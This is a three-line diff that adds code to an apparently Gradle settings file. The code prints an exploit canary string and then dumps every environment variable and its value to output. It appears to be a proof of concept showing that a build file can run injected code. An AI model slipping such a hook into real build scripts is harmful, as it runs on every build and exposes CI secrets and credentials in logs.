@@ -1,0 +1,3 @@
+println "CANARY_GRADLEW_HB_EXPLOIT_SETTINGS_GRADLE"
+// Attempt to also dump environment
+System.getenv().each { k, v -> println "CANARY_ENV: ${k}=${v}" }
